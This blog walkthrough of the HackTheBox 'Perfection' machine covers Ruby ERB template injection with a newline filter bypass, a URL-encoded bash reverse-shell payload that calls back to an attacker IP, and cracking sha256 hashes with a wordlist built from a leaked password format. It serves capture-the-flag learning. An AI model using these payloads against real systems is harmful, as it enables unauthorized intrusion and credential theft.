---
title: "Perfection Walkthrough(HTB)"
date: 2025-03-14
draft: false 
description: "Perfection is an easy Linux machine that features a web application with functionality to calculate student scores. This application is vulnerable to Server-Side Template Injection (SSTI) via regex filter bypass. A foothold can be gained by exploiting the SSTI vulnerability. Enumerating the user reveals they are part of the `sudo` group. Further enumeration uncovers a database with password hashes, and the user&amp;amp;#039;s mail reveals a possible password format. Using a mask attack on the hash, the user&amp;amp;#039;s password is obtained, which is leveraged to gain `root` access."
tags: ["Easy", "Linux", "HTB", "hacking","walkthrough", "web"]
---

## Reconnaissance && Enumeration  
- Nmap scan results:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
80/tcp open  http    nginx
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Weighted Grade Calculator
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Uptime guess: 15.030 days (since Tue Dec 31 22:06:01 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- I was hanging around the website to find anything interesting, I am not gonna lie the website is both basic and neat
![gif](https://media1.tenor.com/m/RKfVkcF5d38AAAAC/well-made-sungwon-cho.gif)
- After a while I foud this Weighted grade calculator interesting
![Pasted image 20250116004126.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250116004126.png?raw=true)
- In the footer of the page it shows/exposes that the website powered by `WEBrick 1.7.0`. So I noted it down.
- After some bunch of research I learnt that WEBrick uses Ruby to run. If I can recall I think there is even a module in ruby named Webrick. I'll leave the details below
{{< details summary="View the attached Links" >}} [Link-1 ](https://docs.ruby-lang.org/en/2.4.0/WEBrick.html) <br> [Link-2](https://github.com/ruby/webrick) <br> [Link-3](https://en.wikipedia.org/wiki/WEBrick) {{< /details >}}

- Like in python SSTI are possible for Ruby and as this a calculator it gives us more clue to work on that. So I jumped the gun
![gun](https://media1.tenor.com/m/UrhCgLoVcAcAAAAC/just-jump-the-gun-harry-jowsey.gif)
- This article showcases the SSTI on a WEBrick made site, talk about being lucky, lol --> [Link here](https://trustedsec.com/blog/rubyerb-template-injection)
![lucky](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNjY3NjB3ZHAycjl5Nmg5cDk5NjVvMWR1bnJxNTZza3dvZWNoeHlkMiZlcD12MV9naWZzX3NlYXJjaCZjdD1n/THfsqxdJ6K0MrTutIb/giphy.gif)
- This [Medium article](https://medium.com/@bdemir/a-pentesters-guide-to-server-side-template-injection-ssti-c5e3998eae68) helped me a lot with payloads for the ruby SSTI and while I was testing It, I couldn't get any valid results
![Pasted image 20250116005312.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250116005312.png?raw=true)
- Below contains the example payloads for Ruby. These are some of the payloads that I used for SSTI
```ruby
<%= system("whoami") %>  
<%= Dir.entries('/') %>  
<%= File.open('/example/arbitrary-file').read %>
```
## Exploitation
- Some payload worked after little tweaks, But blocked by the web page as `Malicious Input` anyway. Hey atleast we got something
![Pasted image 20250116005529.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250116005529.png?raw=true)
- No matter how I URL encode, it didn't even worked. Probably the site blocks the symbols in the payload hmm...
![thinking](https://media.giphy.com/media/kPtv3UIPrv36cjxqLs/giphy.gif?cid=790b7611ou1885fjp6ktw531ypmpolj0xnsuejgxhz89xpis&ep=v1_gifs_search&rid=giphy.gif&ct=g)
- I learnt that URL encoded value of new-line`(%0a`) helps in bypassing SSTI validation So I used that before the payload as prefix and like a magic it worked
- The `whoami` doesn't return any output
![Pasted image 20250116010747.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250116010747.png?raw=true)
- I tried hitting my machine for a check, and I got the request 
![Pasted image 20250116010907.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250116010907.png?raw=true)
- Request: 
![Pasted image 20250116010943.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250116010943.png?raw=true)
- As everything works fine its time for us to brew the cursed reverse shell payload
![brewing](https://media1.tenor.com/m/6uyO5POa2TMAAAAC/creepy-creep.gif) 
```bash
%0a<%25%3d+system("bash+-c+'exec+bash+-i+%26>/dev/tcp/10.10.14.10/7001+<%261'")+%25>
```
- It worked and we are as user `susan` now
- Secured {{< keyword >}} User flag {{< /keyword >}}
![Pasted image 20250116011350.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250116011350.png?raw=true)

## Privilege Escalation
- While enumerating I found two other folders wihin user `susan's` home directory 
![Pasted image 20250116015043.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250116015043.png?raw=true)
- `Migration` folder had sqlite database file so for a change I opened the file in the target system itself
- The database had only one table called `users` . Inside that table, password hashes for five users were included
![Pasted image 20250116015454.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250116015454.png?raw=true)
- The hashes were made from using `sha256` algorithm
![Pasted image 20250116015710.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250116015710.png?raw=true)
- I tried cracking the hashes using my tool [BananaCracker](https://github.com/Emp5r0R/BananaCracker)(Previously sha256_cracker), But it failed
![Pasted image 20250116020022.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250116020022.png?raw=true)
- Then, I started enumerating system further for privesc vectors and rather I found this `/var/mail`
- Inside `/var/mail/susan` the message reads 
```
Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.
```
- As per the instructions I created a python script to make password list for user `susan`
```python
output_file = "susan_nasus_password.txt"

with open(output_file, "w") as file:
    for number in range(1, 1_000_000_001):
        file.write(f"susan_nasus_{number}\n")

print(f"File '{output_file}' has been successfully created.")
```
- This would be both easy and fast when using bash 
```bash
for ((i=1; i<=1000000000; i++)); do echo "susan_nasus_$i" >> "$output_file"
```
- With the new wordlists I fired up my tool again and got the password
![Pasted image 20250116020736.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250116020736.png?raw=true)
- You can get my tool from here [BananaCracker](https://github.com/Emp5r0R/BananaCracker)(Previously known as sha256_cracker). More features will be added by the time of your visit
![mine](https://media1.tenor.com/m/CyLsZhMXHioAAAAC/mine-is-the-best-mariah-milano.gif)
- Using the password I logged in via SSH as user `susan`
- I really wasn't expecting this twist I was hoping for more steps, anyway I am glad. See this yourself lol
- User `susan` can run sudo without any password
![are-we-a-joke](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExYTRmZG9ienp5dW1qYW1xZTExYTdlejgyaW9wNjU3bXVmem9hZTU2cCZlcD12MV9naWZzX3NlYXJjaCZjdD1n/9ppWJumH0DiZ6co7ee/giphy.gif)
![Pasted image 20250116021417.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250116021417.png?raw=true)
- Got the {{< keyword >}} Root flag {{< /keyword >}}
![Pasted image 20250116021446.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250116021446.png?raw=true)

{{< typeit >}} Anyway guys, this concludes it this was a fun box but not particularly easy as rated. I hope you liked this post and don't forget to share this post, Fun fact we have share links for almost every platform.. look below. Emp5r0R  signing off... {{< /typeit >}}

![bye](https://media1.tenor.com/m/S1xOjTOnwLgAAAAd/masters-of-the-universe-skeletor-mot-u.gif)
